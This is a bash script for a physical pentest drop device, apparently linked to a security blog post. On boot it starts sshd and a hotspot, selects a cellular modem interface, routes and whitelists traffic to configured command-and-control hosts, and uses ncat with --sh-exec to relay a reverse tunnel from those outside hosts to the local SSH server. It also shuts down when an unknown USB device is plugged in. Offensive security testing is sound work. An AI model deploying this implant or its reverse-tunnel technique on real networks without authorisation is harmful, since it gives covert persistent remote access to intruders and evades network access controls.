#!/bin/bash

###
# purpose:
#   Run after startup to establish a reverse connection to a C&C server which
#   the pentester can use to establish an SSH-Session on this device from the
#   C&C server.
#
# Usage:
#   Configure the script behaviour by setting the configuration variables in the
#   config.sh file. Also check out the associated blogpost at
#   https://www.scip.ch/en/?labs.20190905.4574bd48
#

_scriptdir=$(dirname "$(readlink -f "$0")")

source "${_scriptdir}/config.sh"

iprgx='((1?[0-9][0-9]?|25[0-5]|2[0-4][0-9])\.){3}(1?[0-9][0-9]?|25[0-5]|2[0-4][0-9])'

start_hotspot() {
    ip l set dev $WIRELESS_IFACE up
    ip a add $AP_IP dev $WIRELESS_IFACE
    udhcpd "$UDHCPD_DIR/$UDHCPD_FILE"
    hostapd -B "$HOSTAPD_DIR/$HOSTAPD_FILE"
}

check_usb() {
    # Purpose:  Periodically check attached usb devices. If an unexpected device
    #           is encountered, persist information about it on disk and shut
    #           down.
    # Takes:    -
    # Returns:  -

    #TODO: implement more sophisticated check using entries in /sys/bus/usb/
    # and disable usb ports selectively instead of shutting down.

    _devices=()
    while read -r _dev
    do
        _devices[${#_devices[@]}]="$_dev"
    done < <(printf "%s\n" "$GOOD_USB" | cut -f 7- -d ' ')

    while :
    do
        while read -r _dev
        do
            _c=1
            for _gooddev in "${_devices[@]}"
            do
                [[ "$_dev" == "$_gooddev" ]] && { _c=0; break; }
            done

            ((_c)) &&
            {
                ((USB_DEBUG)) &&
                {
                    printf "%s\tunrecognized device:\t%s\n" \
                        "$(date '+%Y/%m/%d-%H:%M:%S')" "$_dev" >/tmp/usb_chk_log
                    continue
                }

                # the output of 'lsusb -v' should be sufficient to identify most
                # inserted devices during later analysis. Consumer USB devices 
                # don't tend to be secretive about the data they divulge.
                lsusb >/root/lsusb_out_$(date +%s)
                lsusb -v >/root/lsusb_out_verbose_$(date +%s)
                sync && shutdown -h 0
            }
        done < <(lsusb | cut -f 7- -d ' ')

        sleep 2
    done
}

get_iface() {
    # Purpose:  Find a suitable interface to phone home with.
    # Takes:    -
    # Returns:  0 on success
    #           1 on failure

    _iface=""
    local _sleeptime=5
    local _max_wait=300
    local _wait=0

    while ((_wait < _max_wait || DISABLE_HOTSPOT))
    do
        for _iface in /sys/class/net/*
        do
            for _mac in "${MACS[@]}"
            do
                if [[ "$(cat /sys/class/net/${_iface##*/}/address)" == "$_mac" ]]
                then
                    _iface="${_iface##*/}"
                    return 0
                fi
            done
        done

        ((_wait+=_sleeptime))
        sleep $_sleeptime; # maybe usb_modeswitch hasn't done its thing yet, so
                           # wait a bit
    done

    return 1
}

check_iface() {
    # Purpose:  Check if an interface is configured and if it's still available
    # Takes:    -
    # Returns:  0 when interface is available and configured
    #           1 when no interface is available or interface is not configured

    [[ -z "$_iface" ]] && return 1 # no interface set

    [[ -e "/sys/class/net/${_iface}/address" ]] &&
    [[ "$(cat "/sys/class/net/${_iface}/address")" == "$_mac" ]] &&
    [[ -n $(ip addr show dev "$_iface" | grep -oE "$iprgx") ]] &&
    return 0 # interface with expected mac available and configured

    return 1 # unexpected interface set or not configured
}

wake_iface() {
    # Purpose:  The HUAWEI E3372 tested suspends after a short time when no
    #           traffic occurs. Packets sent with the device in suspended state
    #           are just dropped, so we generate some traffic here and check if
    #           we appear to have a working internet connection (also waking the
    #           stick in the process).
    # Takes:    -
    # Returns:  0 if we have an internet connection
    #           1 if we do not have an internet connection

    local _wait=0
    local _icmp_dst='1.1.1.1'
    local _del_route=0
    [[ -z "$(ip route show default via "$_gw" dev "$_iface")" ]] &&
    {
        ip route add default via "$_gw" dev "$_iface"
        _del_route=1
    }

    for ((i=0 ; ; i++)); do
        iptables -t filter -I OUTPUT 1 --proto icmp -d $_icmp_dst -o "$_iface" -j ACCEPT
        local loss=$(ping -c 3 $_icmp_dst | grep -oE "[[:digit:]]+%")
        iptables -t filter -D OUTPUT 1

        ((${loss%%%*}<100)) &&
        {
            ((_del_route)) && ip route del default via "$_gw" dev "$_iface"
            return 0
        }

        ((_wait>210)) && return 1
        ((_wait+=i))
        sleep $i
    done
}

rst_iface() {
    # Purpose:  Reset interface by reconfiguring or reboot if FAILURE_REBOOT is
    #           set to 1
    # Takes:    -
    # Returns:  0

    ((FAILURE_REBOOT)) && reboot ||
    {
        pkill -f "dhclient $_iface"
        unset _iface _mac
    }

    return 0
}

conf_iface() {
    # Purpose:  Configure Interface. Returns successfully or reboots on failure.
    # takes:    -
    # returns:  -

    ip route flush dev "$_iface"
    ip addr flush dev "$_iface"
    ip link set dev "$_iface" down

    dhclient "$_iface" ||
    {
        sleep 15
        dhclient "$_iface" #retry once on failure
    } || reboot

    cat /dev/null >/etc/resolv.conf
}

main() {

    [[ -n "$GOOD_USB" ]] && check_usb &

    # start sshd
    mkdir -pm 0755 /run/sshd
    ${SSHD_BIN:-systemctl start ssh}

    ((DISABLE_HOTSPOT)) || start_hotspot

    while :
    do
        check_iface ||
        {
            get_iface || continue # can't move on without a usable interface

            conf_iface

            wake_iface || { ((FAILURE_REBOOT)) && reboot; } ||
            { rst_iface && continue; }


            # c&c traffic should use the designated interface, also whitelist c&c
            # traffic so the NAC bypass script doesn't lock the pentester out.
            
            _gw=$(ip route show default dev $_iface | grep -oE "$iprgx")
            ip route del default dev $_iface

            for _host in "${HOMES[@]%:*}"
            do
                [[ -z "$(ip route show $_host dev $_iface proto static scope global via $_gw)" ]] &&
                ip route add $_host dev $_iface proto static scope global via $_gw

                iptables -t filter -C OUTPUT -o $_iface -d $_host -j ACCEPT ||
                {
                    iptables -t filter -I OUTPUT 1 -o $_iface -d $_host -j ACCEPT

                    iptables -t filter -C OUTPUT ! -o $_iface -d $_host -j REJECT ||
                    iptables -t filter -I OUTPUT 2 ! -o $_iface -d $_host -j REJECT
                }
            done
        }

        # wake up interface in case it suspended and establish connection to first available host
        wake_iface || { rst_iface && continue; }

        for _elem in "${HOMES[@]}"; do
            _host="${_elem%:*}"
            _port="${_elem##*:}"

            [[ -n $(hping3 --syn -c 3 $_host -p $_port | grep -m 1 -io "flags=SA") ]] &&
            ncat $_host $_port --wait 10 --sh-exec "ncat 127.0.0.1 $SSHD_PORT"
        done

        sleep 60
    done
}

main "$@"
